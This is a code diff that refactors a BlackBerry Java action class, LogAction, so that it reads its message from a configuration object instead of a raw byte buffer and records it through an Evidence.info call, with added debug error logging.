@@ -9,14 +9,12 @@
 
 package blackberry.action;
 
-import java.io.EOFException;
-
-import net.rim.device.api.util.DataBuffer;
+import blackberry.Trigger;
+import blackberry.config.ConfAction;
+import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
 import blackberry.evidence.Evidence;
-import blackberry.utils.WChar;
 
 public class LogAction extends SubAction {
 
@@ -24,40 +22,33 @@ public class LogAction extends SubAction {
     static Debug debug = new Debug("LogAction", DebugLevel.VERBOSE);
     //#endif
 
-    private String info;
+    private String msg;
 
-    public LogAction(int actionId) {
-        super(actionId);
-    }
-
-    public LogAction(final int actionId_, final byte[] confParams) {
-        super(actionId_);
-        parse(confParams);
+    public LogAction(ConfAction conf) {
+        super(conf);
     }
 
     /*
      * (non-Javadoc)
      * @see blackberry.action.SubAction#execute(blackberry.event.Event)
      */
-    public boolean execute(final Event triggeringEvent) {
-        if(info!=null && info.length() > 0){
-            Evidence.info(info);
+    public boolean execute(final Trigger triggeringEvent) {
+        if (msg != null && msg.length() > 0) {
+            Evidence.info(msg);
             return true;
-        }else{
+        } else {
             return false;
         }
     }
 
-    protected boolean parse(byte[] confParams) {
-        final DataBuffer databuffer = new DataBuffer(confParams, 0,
-                confParams.length, false);
+    protected boolean parse(ConfAction params) {
         try {
-            final int len = databuffer.readInt();
-            final byte[] buffer = new byte[len];
-            databuffer.read(buffer);
-            info = WChar.getString(buffer, true);
-
-        } catch (final EOFException e) {
+            this.msg = params.getString("text");
+        } catch (ConfigurationException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("parse");
+            //#endif
             return false;
         }
 
